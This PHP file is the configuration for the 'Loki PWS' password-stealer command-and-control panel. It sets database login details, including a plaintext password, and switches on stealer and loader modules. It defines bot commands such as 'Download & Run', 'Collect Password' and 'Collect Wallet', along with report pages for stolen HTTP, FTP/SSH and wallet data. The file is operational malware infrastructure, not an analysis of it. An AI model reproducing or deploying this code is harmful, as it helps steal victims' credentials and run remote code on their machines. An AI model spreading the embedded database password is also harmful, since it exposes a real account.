<?php
	if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) die("File not found.");

	@date_default_timezone_set('Europe/Minsk');
	@set_time_limit(NULL);
	@ini_set('max_execution_time', NULL);

	$DBData = array
	(
		'hostname' => "localhost",
		'username' => "hiepph96_incs",
		'password' => "Cream3040@",
		'database' => "hiepph96_inc",
		'port' 	   => 0,
		'prefix'   => "FRox",
		'aes_key'  => 0,
	);
	
	define("IN_LOKI", 		TRUE);
	
	define("LANG_DB", 		"lang.db.php");
	define("TITLE", 		"Loki PWS");
	
	define("LANG_", 		"en");
	define("E404_", 		"File not found.");
	
	define("DEBUG_",		TRUE);
	define("CAPTCHA", 		1);
	define("AUTH_URL", 		FALSE);
	define("AUTH_AGENT", 	FALSE);
	
	define("TEMP_", 		"FmyRZdg");
	define("URL_", 			"");
	define("AGENT_", 		"");
	define("INCLUDE_", 		"wvNWIof");
	define("WALLET_", 		"XNbBCoxfTrKfPCe");
	define("ENCKEY_", 		"wyKFIpw");
	define("COOKIE_", 		"EDPmVCFU");
	define("EXTENSION_", 	".txt");
	
	define("ACTVALUE_", 	"wxWK");
	define("OPTVALUE_", 	"Ctjn");
	define("AUTHVALUE_", 	"TJAo");
	
	define("MODULE_STEALER",		1);
	define("MODULE_LOADER",			1);
	define("MODULE_WALLET",			0);
	define("MODULE_FILE_GRABBER",	0);
	define("MODULE_STRESSER",		0);
	define("MODULE_POS_GRABBER",	0);
	define("MODULE_KEYLOGGER",		0);
	define("MODULE_SCREENSHOT",		0);
	
	if(DEBUG_)
	{
		@ini_set('display_errors','On');
		@ini_set('error_reporting', E_ALL);
	}
	else
	{
		@ini_set('display_errors','Off');
		@ini_set('error_reporting', NULL);
	}
	

	$White_BotAgents_Lists = array ("Mozilla/4.08 (Charon; Inferno)");
	$White_Lists = array();

	$Lang		 = LANG_;
	$PageLimitDB = array ( 10, 20, 30, 50, 100); 
	$PageLimit 	 = 10;
	$PageID    	 = 1;

	$PrivilegesDB = array 
	(
		0 => 'Read, Export, Delete, Settings, .. (ALL)', 
		1 => 'Read, Export, Delete'
	);
	
	$CommandsDB = array 
	(
		0 => 'Download & Run', 
		1 => 'Download & Load',
		2 => 'Download & Drop',
		3 => '-',
		8  => 'Remove Hash DB',
		9  => 'Enable Keylogger',
		10 => 'Collect Password',
		11 => 'Collect Wallet',
		12 => 'Collect File',
		13 => 'Collect Bin/Dump',
		
		14 => 'Shutdown Bot (Only Bot, not PC)',
		15 => 'Update Bot',
		16 => 'Update reconnect intervall',
		17 => 'Uninstall Bot',
		18 => 'Screenshot',
	);
	
	$Page = array();
	
	if(MODULE_LOADER)
	{
		if(!MODULE_STRESSER)
			unset($CommandsDB[3]);
		if(!MODULE_FILE_GRABBER)
			unset($CommandsDB[12]);
		if(!MODULE_POS_GRABBER)
			unset($CommandsDB[13]);
		if(!MODULE_KEYLOGGER)
			unset($CommandsDB[10]);
		
		$Page = array
		(
			array("main", "Main"),
			array(" ", "Bots", 
				array(
					array("bot", "Bots"), 
					array(" ", "divider"), 
					array("command", "Commands")
				)),
				
			array(" ", "Reports", 
				array(
					array("report", "Reports"),
					array(" ", "divider"),
					array("http", "HTTP"), 
					array("ftp", "FTP/SSH"), 
					array("other", "Others"), 
					array("wallet", "Wallet"),
					array("dump", "Dumps")
				)),
				
			array("settings", "Settings"), 
			array("exit", "Exit")
		);
		
		if(!MODULE_STEALER)
		{
			unset($Page[2][2][2]);
			unset($Page[2][2][3]);
			unset($Page[2][2][4]);
			unset($CommandsDB[10]);
		}
		if(!MODULE_WALLET)
		{
			unset($CommandsDB[11]);
			unset($Page[2][2][5]);
		}
		if(!MODULE_SCREENSHOT)
			unset($CommandsDB[18]);
		if(!MODULE_POS_GRABBER)
			unset($Page[2][2][6]);
	}
	else
	{
		$Page = array
		(
			array("main", "Main"), 
			array("http", "HTTP"), 
			array("ftp", "FTP/SSH"),
			array("other", "Others"),
			array("wallet", "Wallet"),
			array("dumps", "Dumps"),
			array("report", "Reports"),
			array("settings", "Settings"), 
			array("exit", "Exit")
		);
		
		if(!MODULE_STEALER)
		{
			unset($Page[1]);
			unset($Page[2]);
			unset($Page[3]);
			
			unset($CommandsDB[10]);
		}
		
		if(!MODULE_POS_GRABBER)
			unset($Page[5]);
		
		if(!MODULE_WALLET)
			unset($Page[4]);
	}
?>
